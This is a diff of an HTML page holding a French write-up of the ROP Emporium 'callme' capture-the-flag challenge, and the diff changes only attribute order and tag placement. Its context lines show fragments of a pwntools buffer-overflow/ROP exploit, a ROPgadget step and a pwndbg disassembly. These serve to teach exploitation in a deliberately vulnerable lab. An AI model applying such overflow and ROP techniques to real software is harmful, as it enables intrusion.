@@ -194,7 +194,7 @@ e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag.
 
 For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
 </code></pre><p>On peut quand même le lancer et voir ce qu&rsquo;il fait:</p>
-<p><img alt="2023-01-15-150610_1072x508_scrot" src="https://user-images.githubusercontent.com/77807503/212548895-0fd03e37-d707-47da-ae38-d1789011bca0.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212548895-0fd03e37-d707-47da-ae38-d1789011bca0.png" alt="2023-01-15-150610_1072x508_scrot"></p>
 <p>Comme pour le précédent, on voit qu&rsquo;on peut overflow le buffer en envoyant un nombre conséquent de bytes. Désassemblons le <code>main</code> pour voir plus clairement ce qu&rsquo;il se passe:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
 </span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
@@ -337,7 +337,7 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall())
 </span></span></code></pre></div><p>Testons le pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
-<p><img alt="2023-01-15-152741_1107x131_scrot" src="https://user-images.githubusercontent.com/77807503/212548940-3656b68e-932b-4e5b-ab2f-d04687f65fdb.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212548940-3656b68e-932b-4e5b-ab2f-d04687f65fdb.png" alt="2023-01-15-152741_1107x131_scrot"></p>
 <p>Et on voit que le programme a <code>segfault</code>&hellip; Pour rappel je suis sous <strong>Ubuntu 22.04</strong> donc mon système est affecté par les problèmes de <em>stack alignment</em>. On va donc ajouter un ret juste après notre padding, qu&rsquo;on peut trouver avec ROPgadget</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary callme
 </span></span><span style="display:flex;"><span>
@@ -396,11 +396,10 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
 </span></span></code></pre></div><p>Et cette fois, il devrait fonctionner:</p>
-<p><img alt="2023-01-15-153142_994x552_scrot" src="https://user-images.githubusercontent.com/77807503/212548977-7d83ef59-bf5a-497e-b655-9011e98b84d5.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212548977-7d83ef59-bf5a-497e-b655-9011e98b84d5.png" alt="2023-01-15-153142_994x552_scrot"></p>
 <p>Parfait, on a réussi à récupérer le flag</p>
 <blockquote>
-<p>Note: Nous ne sommes pas en x86_x64 donc nous n&rsquo;aurions pas dû avoir besoin de doubler les valeurs des arguments comme dit dans la consigne mais ça ne fonctionnait pas sans&hellip;</p>
-</blockquote>
+<p>Note: Nous ne sommes pas en x86_x64 donc nous n&rsquo;aurions pas dû avoir besoin de doubler les valeurs des arguments comme dit dans la consigne mais ça ne fonctionnait pas sans&hellip;</p></blockquote>
 
       </div>
     </article>
